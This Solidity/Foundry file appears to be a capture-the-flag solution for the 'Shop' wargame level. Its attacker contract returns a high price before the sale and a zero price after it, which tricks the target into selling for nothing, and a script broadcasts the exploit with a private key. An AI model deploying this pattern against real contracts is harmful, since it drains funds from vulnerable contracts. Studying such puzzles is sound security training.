// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Instances/Shop.sol";
import "forge-std/console.sol";
import "forge-std/Script.sol";

contract Attack {
    Shop public target = Shop(0x04c9233fed06C81C043bc62103A31D2bC7FC4A2A);

    function price() external view returns(uint) {
        if (target.isSold() == false) {
            return 100;
        } else {
            return 0;
        }
    }

    function exploit() external {
        target.buy();
    }
}

contract Exploit is Script {
    Shop public target = Shop(0x04c9233fed06C81C043bc62103A31D2bC7FC4A2A);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();
        console.log("before price: ", target.price());
        attack.exploit();
        console.log("after price: ", target.price());
        vm.stopBroadcast();
    }
}